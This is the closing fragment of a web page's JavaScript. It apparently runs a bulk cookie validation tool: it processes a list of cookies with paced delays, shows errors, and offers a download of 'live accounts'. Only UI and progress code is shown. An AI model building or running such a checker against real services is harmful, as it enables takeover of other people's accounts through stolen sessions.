                $('#bulkResultsList').append(`<div class="carousel-card ${isActiveClass}"><div class="result-item d-flex align-items-center"><span class="status-badge status-error mr-3">SYS_ERR</span><span class="text-slate-400 break-all sm:break-normal text-xs sm:text-sm">${error.message}</span></div></div>`);
                updateCarouselUI();
            }

            if (i < cookiesToProcess.length - 1) {
                $('#progressText').html(`<i class="fas fa-hourglass-half text-[#00e5ff] mr-2"></i>Delaying ${dynamicWait/1000}s... (${i + 1}/${cookiesToProcess.length})`);
                await sleep(dynamicWait); 
            }
        }

        $('#progressText').html(`<i class="fas fa-check-circle text-emerald-400 mr-2"></i>Finished! Processed ${cookiesToProcess.length} total.`);
        $('#startBulkBtn').prop('disabled', false).html('<i class="fas fa-layer-group mr-2 flex-shrink-0"></i> <span>INITIATE VALIDATION</span>');
        if (bulkLiveAccounts.length > 0) { $('#downloadWrapper').fadeIn(); }
    }

    document.addEventListener('DOMContentLoaded', function() {
        const btn = document.getElementById('mobileMenuBtn'); const menu = document.getElementById('mobileMenu');
        if(btn && menu) {
            btn.addEventListener('click', function() {
                menu.classList.toggle('hidden'); const icon = btn.querySelector('i');
                if(menu.classList.contains('hidden')) { icon.classList.remove('fa-times'); icon.classList.add('fa-bars'); } else { icon.classList.remove('fa-bars'); icon.classList.add('fa-times'); }
            });
        }
    });
</script>

</body>
</html>
